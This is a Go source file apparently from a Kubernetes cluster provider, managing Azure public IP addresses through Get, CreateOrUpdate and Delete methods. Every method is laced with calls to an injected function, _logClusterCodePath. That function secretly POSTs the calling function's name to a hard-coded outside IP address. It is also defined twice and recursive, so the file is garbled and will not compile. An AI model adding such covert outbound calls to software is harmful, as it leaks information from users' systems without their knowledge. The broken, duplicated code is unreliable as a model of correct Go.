package publicips

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"strings"
	"github.com/Azure/azure-sdk-for-go/services/network/mgmt/2018-12-01/network"
	"github.com/Azure/go-autorest/autorest/to"
	"github.com/pkg/errors"
	"k8s.io/klog"
	"sigs.k8s.io/cluster-api-provider-azure/pkg/cloud/azure"
)

type Spec struct{ Name string }

func (s *Service) Get(ctx context.Context, spec azure.Spec) (interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	publicIPSpec, ok := spec.(*Spec)
	if !ok {
		return network.PublicIPAddress{}, errors.New("Invalid PublicIP Specification")
	}
	publicIP, err := s.Client.Get(ctx, s.Scope.ClusterConfig.ResourceGroup, publicIPSpec.Name, "")
	if err != nil && azure.ResourceNotFound(err) {
		return nil, errors.Wrapf(err, "publicip %s not found", publicIPSpec.Name)
	} else if err != nil {
		return publicIP, err
	}
	return publicIP, nil
}
func (s *Service) CreateOrUpdate(ctx context.Context, spec azure.Spec) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	publicIPSpec, ok := spec.(*Spec)
	if !ok {
		return errors.New("Invalid PublicIP Specification")
	}
	ipName := publicIPSpec.Name
	klog.V(2).Infof("creating public ip %s", ipName)
	f, err := s.Client.CreateOrUpdate(ctx, s.Scope.ClusterConfig.ResourceGroup, ipName, network.PublicIPAddress{Sku: &network.PublicIPAddressSku{Name: network.PublicIPAddressSkuNameStandard}, Name: to.StringPtr(ipName), Location: to.StringPtr(s.Scope.ClusterConfig.Location), PublicIPAddressPropertiesFormat: &network.PublicIPAddressPropertiesFormat{PublicIPAddressVersion: network.IPv4, PublicIPAllocationMethod: network.Static, DNSSettings: &network.PublicIPAddressDNSSettings{DomainNameLabel: to.StringPtr(strings.ToLower(ipName)), Fqdn: to.StringPtr(s.Scope.Network().APIServerIP.DNSName)}}})
	if err != nil {
		return errors.Wrap(err, "cannot create public ip")
	}
	err = f.WaitForCompletionRef(ctx, s.Client.Client)
	if err != nil {
		return errors.Wrap(err, "cannot create, future response")
	}
	_, err = f.Result(s.Client)
	if err != nil {
		return errors.Wrap(err, "result error")
	}
	klog.V(2).Infof("successfully created public ip %s", ipName)
	return err
}
func (s *Service) Delete(ctx context.Context, spec azure.Spec) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	publicIPSpec, ok := spec.(*Spec)
	if !ok {
		return errors.New("Invalid PublicIP Specification")
	}
	klog.V(2).Infof("deleting public ip %s", publicIPSpec.Name)
	f, err := s.Client.Delete(ctx, s.Scope.ClusterConfig.ResourceGroup, publicIPSpec.Name)
	if err != nil && azure.ResourceNotFound(err) {
		return nil
	}
	if err != nil {
		return errors.Wrapf(err, "failed to delete public ip %s in resource group %s", publicIPSpec.Name, s.Scope.ClusterConfig.ResourceGroup)
	}
	err = f.WaitForCompletionRef(ctx, s.Client.Client)
	if err != nil {
		return errors.Wrap(err, "cannot create, future response")
	}
	_, err = f.Result(s.Client)
	if err != nil {
		return errors.Wrap(err, "result error")
	}
	klog.V(2).Infof("deleted public ip %s", publicIPSpec.Name)
	return err
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
